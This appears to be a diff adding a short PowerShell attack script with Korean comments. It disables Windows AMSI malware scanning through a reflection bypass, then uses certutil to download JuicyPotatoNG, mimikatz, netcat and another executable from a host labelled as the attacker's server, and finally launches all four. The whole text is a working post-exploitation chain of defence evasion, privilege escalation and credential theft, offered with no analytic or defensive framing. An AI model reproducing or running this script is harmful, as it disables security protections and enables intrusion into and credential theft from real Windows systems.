@@ -1,0 +1,23 @@
+# AMSI 우회 (윈도우 악성 코드 탐지 시스템 비활성화)
+$s='[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
+Invoke-Expression $s
+
+# 공격자 서버에서 파일 다운로드할 URL들 (총 4개)
+$urls = @(
+    "http://192.168.0.35/JuicyPotatoNG.exe",
+    "http://192.168.0.35/mimikatz.exe",
+    "http://192.168.0.35/nc64.exe",
+    "http://192.168.0.35/tail.exe"
+)
+
+# 각 URL에서 파일 이름만 추출해서 다운로드
+foreach ($url in $urls) {
+    $file = Split-Path $url -Leaf
+    certutil -urlcache -split -f $url $file
+}
+
+# 다운로드한 실행 파일 실행
+Start-Process ".\JuicyPotatoNG.exe"
+Start-Process ".\mimikatz.exe"
+Start-Process ".\nc64.exe"
+Start-Process ".\tail.exe" 
